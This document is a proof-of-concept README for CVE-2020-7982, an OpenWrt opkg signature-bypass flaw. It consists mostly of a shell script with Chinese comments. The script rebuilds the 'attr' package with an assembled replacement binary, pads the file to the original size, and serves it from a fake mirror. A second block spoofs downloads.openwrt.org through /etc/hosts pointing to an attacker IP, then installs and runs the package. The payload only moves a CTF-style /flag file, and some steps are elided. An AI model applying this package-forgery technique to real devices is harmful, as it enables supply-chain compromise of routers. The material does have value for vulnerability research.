# cve-2020-7982 POC

```shell
#!/bin/bash

# 下载OpenWrt的软件包列表
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.gz
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.sig
# ... [其他下载命令]

# 将下载的内容移至当前目录并清除临时目录
mv downloads.openwrt.org/snapshots .
rm -rf downloads.openwrt.org/

# 获取并解压原始“attr”软件包
wget http://downloads.openwrt.org/snapshots/packages/x86_64/packages/attr_2.5.1-1_x86_64.ipk
ORIGINAL_FILESIZE=$(stat -c%s "attr_2.5.1-1_x86_64.ipk")
tar zxf attr_2.5.1-1_x86_64.ipk
rm attr_2.5.1-1_x86_64.ipk

# 解压数据包中的文件
mkdir data/
cd data/
tar zxvf ../data.tar.gz
rm ../data.tar.gz

# 创建替换的二进制程序，用于将/flag移动到/www/flag
rm -f /tmp/pwned.asm /tmp/pwned.o
# ... [汇编指令]

# 使用nasm进行编译并链接生成新的二进制文件
nasm /tmp/pwned.asm -f elf64 -o /tmp/pwned.o
ld /tmp/pwned.o -o usr/bin/attr

# 压缩修改后的文件并返回上级目录
tar czvf ../data.tar.gz *
cd ../

# 清除临时的解压目录
rm -rf data/

# 创建新的“attr”软件包
tar czvf attr_2.5.1-1_x86_64.ipk control.tar.gz data.tar.gz debian-binary
rm control.tar.gz data.tar.gz debian-binary

# 确定新旧软件包的大小差异，并补充所需字节以匹配原始文件大小
MODIFIED_FILESIZE=$(stat -c%s "attr_2.5.1-1_x86_64.ipk")
FILESIZE_DELTA="$(($ORIGINAL_FILESIZE-$MODIFIED_FILESIZE))"
head /dev/zero -c$FILESIZE_DELTA >>attr_2.5.1-1_x86_64.ipk

# 下载“attr”软件包的依赖文件
wget http://downloads.openwrt.org/snapshots/packages/x86_64/packages/libattr_2.5.1-1_x86_64.ipk

# 将要在Web服务器上提供的文件移至指定位置
mkdir -p snapshots/packages/x86_64/packages/
mv attr_2.5.1-1_x86_64.ipk snapshots/packages/x86_64/packages/
mv libattr_2.5.1-1_x86_64.ipk snapshots/packages/x86_64/packages/

# 使用Python启动一个Web服务器，以提供软件包给opkg下载
sudo python -m SimpleHTTPServer 80

```

在openwrt方安装前，需要修改/etc/opkg/distfeeds.conf中内容：

```shell
# 将原先内容替换,使得伪造后的下载地址指向托管服务器中内容(非必要，与安装软件包有关）：
cat << EOF > /etc/opkg/distfeeds.conf
src/gz openwrt_core http://downloads.openwrt.org/snapshots/targets/x86/64/packages
src/gz openwrt_base http://downloads.openwrt.org/snapshots/packages/x86_64/base
src/gz openwrt_luci http://downloads.openwrt.org/snapshots/packages/x86_64/luci
src/gz openwrt_packages http://downloads.openwrt.org/snapshots/packages/x86_64/packages
src/gz openwrt_routing http://downloads.openwrt.org/snapshots/packages/x86_64/routing
src/gz openwrt_telephony http://downloads.openwrt.org/snapshots/packages/x86_64/telephony
EOF

# 伪造服务器(172.23.142.55为托管服务器地址)，同时安装恶意软件包，此时flag(若存在)将被转移至/www目录下
echo "172.23.142.55 downloads.openwrt.org" >>/etc/hosts; opkg update && opkg install attr && attr
```

